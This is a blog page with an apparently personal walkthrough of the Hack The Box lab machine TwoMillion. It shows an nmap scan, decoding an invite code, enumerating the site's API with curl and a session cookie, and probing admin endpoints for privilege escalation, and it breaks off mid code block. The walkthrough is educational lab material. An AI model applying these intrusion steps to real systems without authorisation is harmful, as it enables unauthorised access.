@@ -1,0 +1,887 @@
+<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="TwoMillion from HTB" /><meta property="og:locale" content="en" /><meta name="description" content="TwoMillion from HTB page Nmap gave this: ``` $ nmap -sCV –min-rate 4000 -Pn 10.10.11.221 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-06 21:16 +04 Nmap scan report for 2million.htb (10.10.11.221) Host is up (0.23s latency). Not shown: 918 filtered tcp ports (no-response), 80 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA) |_ 256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519) 80/tcp open http nginx |http-trane-info: Problem with XML parsing of /evox/about |_http-title: Hack The Box :: Penetration Testing Labs | http-cookie-flags: | /: | PHPSESSID: | httponly flag not set Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel" /><meta property="og:description" content="TwoMillion from HTB page Nmap gave this: ``` $ nmap -sCV –min-rate 4000 -Pn 10.10.11.221 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-06 21:16 +04 Nmap scan report for 2million.htb (10.10.11.221) Host is up (0.23s latency). Not shown: 918 filtered tcp ports (no-response), 80 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA) |_ 256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519) 80/tcp open http nginx |http-trane-info: Problem with XML parsing of /evox/about |_http-title: Hack The Box :: Penetration Testing Labs | http-cookie-flags: | /: | PHPSESSID: | httponly flag not set Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel" /><link rel="canonical" href="https://darkfears31.github.io/posts/twomillion-from-HTB/" /><meta property="og:url" content="https://darkfears31.github.io/posts/twomillion-from-HTB/" /><meta property="og:site_name" content="darkfears31’s Walktroughs" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2024-09-06T00:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="TwoMillion from HTB" /><meta name="twitter:site" content="@twitter_username" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-09-06T00:00:00+00:00","datePublished":"2024-09-06T00:00:00+00:00","description":"TwoMillion from HTB page Nmap gave this: ``` $ nmap -sCV –min-rate 4000 -Pn 10.10.11.221 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-06 21:16 +04 Nmap scan report for 2million.htb (10.10.11.221) Host is up (0.23s latency). Not shown: 918 filtered tcp ports (no-response), 80 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA) |_ 256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519) 80/tcp open http nginx |http-trane-info: Problem with XML parsing of /evox/about |_http-title: Hack The Box :: Penetration Testing Labs | http-cookie-flags: | /: | PHPSESSID: | httponly flag not set Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel","headline":"TwoMillion from HTB","mainEntityOfPage":{"@type":"WebPage","@id":"https://darkfears31.github.io/posts/twomillion-from-HTB/"},"url":"https://darkfears31.github.io/posts/twomillion-from-HTB/"}</script><title>TwoMillion from HTB | darkfears31's Walktroughs</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="darkfears31's Walktroughs"><meta name="application-name" content="darkfears31's Walktroughs"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="https://avatars.githubusercontent.com/u/162694375?v=4" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">darkfears31's Walktroughs</a></div><div class="site-subtitle font-italic">An PicoCTF and HackTheBox Walktroughs</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/darkfears31" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://youtube.com/user/jadehawk" aria-label="youtube" target="_blank" rel="noopener"> <i class="fab fa-youtube"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>TwoMillion from HTB</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>TwoMillion from HTB</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1725580800" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Sep 6, 2024 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://github.com/darkfears31">kaikaci</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2907 words"> <em>16 min</em> read</span></div></div></div><div class="post-content"><h1 id="twomillion-from-htb">TwoMillion from HTB</h1><p><a href="https://app.hackthebox.com/machines/TwoMillion">page</a> <code class="language-plaintext highlighter-rouge">Nmap</code> gave this:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+</pre><td class="rouge-code"><pre>$ nmap -sCV --min-rate 4000 -Pn 10.10.11.221
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-06 21:16 +04
+Nmap scan report for 2million.htb (10.10.11.221)
+Host is up (0.23s latency).
+Not shown: 918 filtered tcp ports (no-response), 80 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
+|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+80/tcp open  http    nginx
+|_http-trane-info: Problem with XML parsing of /evox/about
+|_http-title: Hack The Box :: Penetration Testing Labs
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      httponly flag not set
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 18.02 seconds
+</pre></table></code></div></div><p>Nothing unusual. Go to site and you can see that it is old <code class="language-plaintext highlighter-rouge">HTB</code>site which was vulnerable. You can search <code class="language-plaintext highlighter-rouge">HTB invite code exploit</code>and do that. Open http://2million.htb/invite and <code class="language-plaintext highlighter-rouge">Inspect</code>it. There is <code class="language-plaintext highlighter-rouge">Invite</code>code, copy that and go to <a href="https://lelinhtinh.github.io/de4js/">de4js</a>and paste the copied code. Then click <code class="language-plaintext highlighter-rouge">Auto Decode</code>:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+</pre><td class="rouge-code"><pre>function verifyInviteCode(code) {
+    var formData = {
+        "code": code
+    };
+    $.ajax({
+        type: "POST",
+        dataType: "json",
+        data: formData,
+        url: '/api/v1/invite/verify',
+        success: function (response) {
+            console.log(response)
+        },
+        error: function (response) {
+            console.log(response)
+        }
+    })
+}
+
+function makeInviteCode() {
+    $.ajax({
+        type: "POST",
+        dataType: "json",
+        url: '/api/v1/invite/how/to/generate',
+        success: function (response) {
+            console.log(response)
+        },
+        error: function (response) {
+            console.log(response)
+        }
+    })
+}
+</pre></table></code></div></div><p>There is a given directory <code class="language-plaintext highlighter-rouge">/api/v1/invite/how/to/generate</code>. Use that to <code class="language-plaintext highlighter-rouge">curl</code>the things inside that directory of the <code class="language-plaintext highlighter-rouge">2million.htb</code> and read it:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre>$ curl -X POST http://2million.htb/api/v1/invite/how/to/generate | jq
+{
+  "0": 200,
+  "success": 1,
+  "data": {
+    "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",
+    "enctype": "ROT13"
+  },
+  "hint": "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."
+}
+</pre></table></code></div></div><p>Copy the text and search <code class="language-plaintext highlighter-rouge">ROT13</code>Decrypt and do it. You will get this:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>In order to generate the invite code, make a POST request to /api/v1/invite/generate
+</pre></table></code></div></div><p>Do as it says in the text:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre>$ curl -sX POST http://2million.htb/api/v1/invite/generate | jq
+{
+  "0": 200,
+  "success": 1,
+  "data": {
+    "code": "UFdENTYtQUtMNFUtV0pCMEgtVVlYS1A=",
+    "format": "encoded"
+  }
+}
+</pre></table></code></div></div><p>From the looks of it, it’s <code class="language-plaintext highlighter-rouge">base64</code>and decrypt it:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>$ echo "UFdENTYtQUtMNFUtV0pCMEgtVVlYS1A=" | base64 -d
+PWD56-AKL4U-WJB0H-UYXKP
+</pre></table></code></div></div><p>This is the token for the registration. Go to <code class="language-plaintext highlighter-rouge">2million.htb/invite</code>and paste the invitation code. Then sign up. You are greeted with this page: <img data-src="/assets/images/Screenshot from 2024-08-06 23-57-07.png" alt="scree" data-proofer-ignore> There isn’t much of pages you can open, but there is one interesting: <code class="language-plaintext highlighter-rouge">Access</code>. The Access page allows a user to Download and Regenerate their <code class="language-plaintext highlighter-rouge">VPN</code> file to be able to access the <code class="language-plaintext highlighter-rouge">HTB</code>infrastructure. Let’s fire up <code class="language-plaintext highlighter-rouge">BurpSuite</code> and see what the <code class="language-plaintext highlighter-rouge">Connection Pack</code> download button does. In <code class="language-plaintext highlighter-rouge">BurpSuite</code>turn the <code class="language-plaintext highlighter-rouge">Intercept</code>button on and click the <code class="language-plaintext highlighter-rouge">Connection Pack</code>button, in <code class="language-plaintext highlighter-rouge">Burp</code>you will get this:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre>GET /api/v1/user/vpn/generate HTTP/1.1
+Host: 2million.htb
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
+Sec-GPC: 1
+Accept-Language: en-US,en;q=0.6
+Referer: http://2million.htb/home/access
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=7a0pbm0uacm9s69027tjukf5e9
+Connection: keep-alive
+</pre></table></code></div></div><p>You can see the cookie that we’ll use for <code class="language-plaintext highlighter-rouge">curl</code>.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+</pre><td class="rouge-code"><pre>$ curl -sv http://2million.htb/api --cookie "PHPSESSID=7a0pbm0uacm9s69027tjukf5e9" | jq
+* Host 2million.htb:80 was resolved.
+* IPv6: (none)
+* IPv4: 10.10.11.221
+*   Trying 10.10.11.221:80...
+* Connected to 2million.htb (10.10.11.221) port 80
+&gt; GET /api HTTP/1.1
+&gt; Host: 2million.htb
+&gt; User-Agent: curl/8.8.0
+&gt; Accept: */*
+&gt; Cookie: PHPSESSID=7a0pbm0uacm9s69027tjukf5e9
+&gt;
+* Request completely sent off
+&lt; HTTP/1.1 200 OK
+&lt; Server: nginx
+&lt; Date: Tue, 06 Aug 2024 17:47:06 GMT
+&lt; Content-Type: application/json
+&lt; Transfer-Encoding: chunked
+&lt; Connection: keep-alive
+&lt; Expires: Thu, 19 Nov 1981 08:52:00 GMT
+&lt; Cache-Control: no-store, no-cache, must-revalidate
+&lt; Pragma: no-cache
+&lt;
+{ [47 bytes data]
+* Connection #0 to host 2million.htb left intact
+{
+  "/api/v1": "Version 1 of the API"
+}
+</pre></table></code></div></div><p>This is what <code class="language-plaintext highlighter-rouge">curling</code> <code class="language-plaintext highlighter-rouge">/api</code>gives. Now we have to <code class="language-plaintext highlighter-rouge">curl /api/v1</code>:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+</pre><td class="rouge-code"><pre>$ curl -sv http://2million.htb/api/v1 --cookie "PHPSESSID=7a0pbm0uacm9s69027tjukf5e9" | jq
+* Host 2million.htb:80 was resolved.
+* IPv6: (none)
+* IPv4: 10.10.11.221
+*   Trying 10.10.11.221:80...
+* Connected to 2million.htb (10.10.11.221) port 80
+&gt; GET /api/v1 HTTP/1.1
+&gt; Host: 2million.htb
+&gt; User-Agent: curl/8.8.0
+&gt; Accept: */*
+&gt; Cookie: PHPSESSID=7a0pbm0uacm9s69027tjukf5e9
+&gt;
+* Request completely sent off
+&lt; HTTP/1.1 200 OK
+&lt; Server: nginx
+&lt; Date: Tue, 06 Aug 2024 17:48:06 GMT
+&lt; Content-Type: application/json
+&lt; Transfer-Encoding: chunked
+&lt; Connection: keep-alive
+&lt; Expires: Thu, 19 Nov 1981 08:52:00 GMT
+&lt; Cache-Control: no-store, no-cache, must-revalidate
+&lt; Pragma: no-cache
+&lt;
+{ [812 bytes data]
+* Connection #0 to host 2million.htb left intact
+{
+  "v1": {
+    "user": {
+      "GET": {
+        "/api/v1": "Route List",
+        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
+        "/api/v1/invite/generate": "Generate invite code",
+        "/api/v1/invite/verify": "Verify invite code",
+        "/api/v1/user/auth": "Check if user is authenticated",
+        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
+        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
+        "/api/v1/user/vpn/download": "Download OVPN file"
+      },
+      "POST": {
+        "/api/v1/user/register": "Register a new user",
+        "/api/v1/user/login": "Login with existing user"
+      }
+    },
+    "admin": {
+      "GET": {
+        "/api/v1/admin/auth": "Check if user is admin"
+      },
+      "POST": {
+        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
+      },
+      "PUT": {
+        "/api/v1/admin/settings/update": "Update user settings"
+      }
+    }
+  }
+}
+</pre></table></code></div></div><p>This is the directories of <code class="language-plaintext highlighter-rouge">2million.htb</code>that we will use.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+</pre><td class="rouge-code"><pre>$ curl -sv http://2million.htb/api/v1/admin/auth --cookie "PHPSESSID=7a0pbm0uacm9s69027tjukf5e9" | jq
+* Host 2million.htb:80 was resolved.
+* IPv6: (none)
+* IPv4: 10.10.11.221
+*   Trying 10.10.11.221:80...
+* Connected to 2million.htb (10.10.11.221) port 80
+&gt; GET /api/v1/admin/auth HTTP/1.1
+&gt; Host: 2million.htb
+&gt; User-Agent: curl/8.8.0
+&gt; Accept: */*
+&gt; Cookie: PHPSESSID=7a0pbm0uacm9s69027tjukf5e9
+&gt;
+* Request completely sent off
+&lt; HTTP/1.1 200 OK
+&lt; Server: nginx
+&lt; Date: Tue, 06 Aug 2024 17:48:36 GMT
+&lt; Content-Type: application/json
+&lt; Transfer-Encoding: chunked
+&lt; Connection: keep-alive
+&lt; Expires: Thu, 19 Nov 1981 08:52:00 GMT
+&lt; Cache-Control: no-store, no-cache, must-revalidate
+&lt; Pragma: no-cache
+&lt;
+{ [28 bytes data]
+* Connection #0 to host 2million.htb left intact
+{
+  "message": false
+}
+</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">curl-ing</code>the <code class="language-plaintext highlighter-rouge">/api/v1/admin/auth</code> gave us the <code class="language-plaintext highlighter-rouge">false</code>because we are not admin.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+</pre><td class="rouge-code"><pre>$ curl -sv -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=7a0pbm0uacm9s69027tjukf5e9" | jq
+* Host 2million.htb:80 was resolved.
+* IPv6: (none)
+* IPv4: 10.10.11.221
+*   Trying 10.10.11.221:80...
+* Connected to 2million.htb (10.10.11.221) port 80
+&gt; POST /api/v1/admin/vpn/generate HTTP/1.1
+&gt; Host: 2million.htb
+&gt; User-Agent: curl/8.8.0
+&gt; Accept: */*
+&gt; Cookie: PHPSESSID=7a0pbm0uacm9s69027tjukf5e9
+&gt;
+* Request completely sent off
+&lt; HTTP/1.1 401 Unauthorized
+&lt; Server: nginx
+&lt; Date: Tue, 06 Aug 2024 18:24:42 GMT
+&lt; Content-Type: text/html; charset=UTF-8
+&lt; Transfer-Encoding: chunked
+&lt; Connection: keep-alive
+&lt; Expires: Thu, 19 Nov 1981 08:52:00 GMT
+&lt; Cache-Control: no-store, no-cache, must-revalidate
+&lt; Pragma: no-cache
+&lt;
+{ [5 bytes data]
+* Connection #0 to host 2million.htb left intact
+</pre></table></code></div></div><p>Here we get <code class="language-plaintext highlighter-rouge">401 Unauthorized</code>. We have to become the admin.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+</pre><td class="rouge-code"><pre>$ curl -v -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=7a0pbm0uacm9s69027tjukf5e9" | jq
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Host 2million.htb:80 was resolved.
+* IPv6: (none)
+* IPv4: 10.10.11.221
+*   Trying 10.10.11.221:80...
+* Connected to 2million.htb (10.10.11.221) port 80
+&gt; PUT /api/v1/admin/settings/update HTTP/1.1
+&gt; Host: 2million.htb
+&gt; User-Agent: curl/8.8.0
+&gt; Accept: */*
+&gt; Cookie: PHPSESSID=7a0pbm0uacm9s69027tjukf5e9
+&gt;
+* Request completely sent off
+  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0&lt; HTTP/1.1 200 OK
+&lt; Server: nginx
+&lt; Date: Tue, 06 Aug 2024 18:34:19 GMT
+&lt; Content-Type: application/json
+&lt; Transfer-Encoding: chunked
+&lt; Connection: keep-alive
+&lt; Expires: Thu, 19 Nov 1981 08:52:00 GMT
+&lt; Cache-Control: no-store, no-cache, must-revalidate
+&lt; Pragma: no-cache
+&lt;
+{ [64 bytes data]
+100    53    0    53    0     0     33      0 --:--:--  0:00:01 --:--:--    33
+* Connection #0 to host 2million.htb left intact
+{
+  "status": "danger",
+  "message": "Invalid content type."
+}
+</pre></table></code></div></div><p>Ignore the <code class="language-plaintext highlighter-rouge">danger</code>we have to change the second error, with Header</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
